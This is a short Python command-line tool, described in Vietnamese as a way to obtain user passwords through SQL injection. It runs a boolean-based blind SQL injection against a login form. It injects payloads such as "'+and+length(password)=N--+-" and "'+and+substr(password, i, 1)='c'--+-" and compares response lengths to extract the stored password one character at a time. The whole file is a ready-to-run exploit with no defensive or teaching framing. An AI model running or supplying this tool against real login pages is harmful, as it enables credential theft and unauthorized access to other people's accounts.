import requests
import argparse
from string import printable
from urllib.parse import parse_qsl, urlsplit

class Sqli:
    def __init__(self, url, data):
        self.url = url
        self.data = data
        self.length = 1

    
    def get_length(self):
        data = dict(parse_qsl(urlsplit('?' + self.data).query))
        length_check = len(requests.post(self.url, data = data).text)
        while True:
            # print(l)
            data = self.data.replace('$', f"'+and+length(password)={self.length}--+-")
            data = dict(parse_qsl(urlsplit('?' + data).query))
            res = requests.post(self.url, data=data)
            # if "Login False" not in res:
            if len(res.text) != length_check:
                print("Length password: ", self.length)
                break
            self.length += 1

    def get_password(self):
        self.get_length()
        passwd = ""
        data = dict(parse_qsl(urlsplit('?' + self.data).query))
        length_check = len(requests.post(self.url, data = data).text)
        for index in range(1, self.length+1):
            for char in printable:
                data = self.data.replace('$', f"'+and+substr(password, {str(index)}, 1)='{char}'--+-")
                data = dict(parse_qsl(urlsplit('?' + data).query))
                res = requests.post(self.url, data=data)
                # if "Login False" not in res.text:
                if len(res.text) != length_check:
                    passwd += char
                    print(passwd)
                    break
        print("Password is: ", passwd)

def main():
    parser = argparse.ArgumentParser(description="Công cụ lấy mật khẩu người dùng bằng SQL Injection")
    parser.add_argument('--url', help='URL Login')
    parser.add_argument('--data', help='Data form login')

    args = parser.parse_args()
    url = args.url
    data = args.data

    s = Sqli(url, data)
    s.get_password()


if __name__ == "__main__":
    main()
